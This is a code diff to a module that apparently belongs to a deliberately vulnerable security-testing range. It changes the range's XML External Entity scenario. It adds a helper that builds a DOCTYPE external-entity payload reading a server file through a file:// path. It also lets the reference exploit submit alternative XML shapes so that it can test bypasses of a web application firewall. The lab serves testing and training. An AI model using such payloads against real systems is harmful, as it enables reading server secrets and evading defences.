@@ -13,6 +13,10 @@ import { Scenario } from './scenario.mjs'
 const libxmljs = libxmljsPkg.default || libxmljsPkg
 const SECRET_PATH = process.env.POLYRANGE_XXE_SECRET_PATH || '/app/data/license.dat'
 
+function canonicalXml(secretPath) {
+  return `<?xml version="1.0"?>\n<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file://${secretPath}"> ]>\n<data><value>&xxe;</value></data>`
+}
+
 let secretWritten = false
 function ensureSecretFile(canary) {
   if (secretWritten) return
@@ -41,7 +45,7 @@ function extractXml(req, rawBody) {
 export const classDef = {
   wstgId: 'WSTG-INPV-07',
   class: 'XML External Entity (XXE)',
-  defenceTiers: [0],
+  defenceTiers: [0, 1],
   Scenario,
   needsSignup: false,
   canaryRuntime: true,
@@ -78,10 +82,14 @@ export const classDef = {
     }
   },
 
-  // Reference exploit: submit a DOCTYPE external-entity document pointing at the
-  // server-side canary file; the resolved entity is echoed back.
-  async fireExploit({ baseUrl, scenario }) {
-    const xml = `<?xml version="1.0"?>\n<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file://${SECRET_PATH}"> ]>\n<data><value>&xxe;</value></data>`
+  // Reference exploit. Submits XML the validator passes in via `payload`; when
+  // the validator hands us a tier-0 placeholder (a non-XML label) we fall back
+  // to the canonical DOCTYPE external-entity document that resolves the
+  // server-side canary file. Honouring the payload arg is what allows the T1
+  // bypass list to actually iterate alternative XML shapes against the WAF.
+  async fireExploit({ baseUrl, scenario, payload }) {
+    const looksLikeXml = typeof payload === 'string' && /^\s*<\?xml|^\s*<!DOCTYPE/i.test(payload)
+    const xml = looksLikeXml ? payload : canonicalXml(SECRET_PATH)
     const r = await fetch(`${baseUrl}${scenario.endpoint.path}`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/xml' },
